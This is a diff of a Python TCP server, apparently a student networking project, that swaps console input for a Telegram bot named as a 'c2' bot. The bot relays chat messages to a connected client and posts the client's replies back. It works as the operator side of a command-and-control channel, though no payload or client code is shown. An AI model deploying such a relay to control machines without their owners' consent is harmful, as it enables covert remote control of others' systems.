@@ -20,50 +20,76 @@
 
 # Importando bibliotecas
 from constantes import *
-import socket
+import requisicoes, socket
 
-# Criando socket TCP e desabilitando TIME_WAIT
-server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+def main():
+    print("Para acessar o bot, pesquise @progredes_c2_bot ou clique no link direto: https://t.me/progredes_c2_bot")
+    print("Para encerrar o bot, pressione Ctrl-C\n")
 
-# Habilitando socket
-server_sock.bind(SOCKET_SERVIDOR)
+    # Criando socket TCP e desabilitando TIME_WAIT
+    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-# Escutando até o máximo de conexões simultaneas permitidas
-server_sock.listen(CONEXOES_MAXIMAS)
+    # Habilitando socket
+    server_sock.bind(SOCKET_SERVIDOR)
 
-parar = False
-while (not parar):
-    # Recebendo conexão do cliente e o apresentando
-    try:
-        client_sock, SOCKET_CLIENTE = server_sock.accept()
-    except:
-        print()
-        break
-    print(f"Cliente {SOCKET_CLIENTE} conectado!")
+    # Escutando até o máximo de conexões simultaneas permitidas
+    server_sock.listen(CONEXOES_MAXIMAS)
 
-    while (True):
-        # Obtendo mensagem do usuário
+    # Loop de funcionamento do bot
+    continuar = True
+    latest_update_id = 0
+    while (continuar):
+        # Recebendo conexão do cliente e o apresentando
         try:
-            mensagem = input("Digite uma mensagem: ").encode(CHARSET)
+            client_sock, socket_cliente = server_sock.accept()
         except:
-            parar = True
             print()
             break
-        if (len(mensagem) == 0):
-            continue
+        print(f"Cliente {socket_cliente} conectado!")
 
-        # Enviando mensagem obtida ao cliente
-        client_sock.send(mensagem)
+        while (continuar):
+            # Obtendo última atualização e mensagem e, em caso de exceção,
+            # tenta-se novamente
+            try:
+                latest_update_id, latest_message = requisicoes.obter_atualizacoes(latest_update_id)
+            except KeyboardInterrupt:
+                continuar = False
+                continue
+            except:
+                continue
 
-        # Recebendo mensagem do cliente
-        mensagem_recebida = client_sock.recv(TAMANHO_BUFFER).decode(CHARSET)
-        if (len(mensagem_recebida) == 0):
-            print(f"Cliente {SOCKET_CLIENTE} desconectado!")
-            break
+            # Se não houver novas mensagens, volta-se ao início
+            if (latest_message == None):
+                continue
 
-        print(f"{SOCKET_CLIENTE}> {mensagem_recebida}")
+            # Interpretando mensagem e salvando última atalização
+            retorno = requisicoes.interpretar_mensagem(latest_message)
+            requisicoes.salvar_update_id(latest_update_id)
+            if (retorno["text"] == '' or retorno["text"] == "./c2 -h" or retorno["text"] == "./c2 -l"):
+                requisicoes.responder_mensagem(retorno)
+                continue
 
-    client_sock.close()
+            # Enviando mensagem obtida ao cliente
+            client_sock.send(retorno["text"].encode(CHARSET))
 
-server_sock.close()
+            # Recebendo mensagem do cliente e respondendo à última mensagem
+            retorno["text"] = client_sock.recv(TAMANHO_BUFFER).decode(CHARSET)
+            if (len(retorno["text"]) == 0):
+                retorno["text"] = f"Cliente {socket_cliente} desconectado!"
+                requisicoes.responder_mensagem(retorno)
+                print(f"Cliente {socket_cliente} desconectado!")
+                break
+            requisicoes.responder_mensagem(retorno)
+
+        client_sock.close()
+
+    server_sock.close()
+    return
+
+# Entrando na função main e, em caso de exceção, saindo
+if (__name__ == "__main__"):
+    try:
+        main()
+    except:
+        print("\nSaindo...")
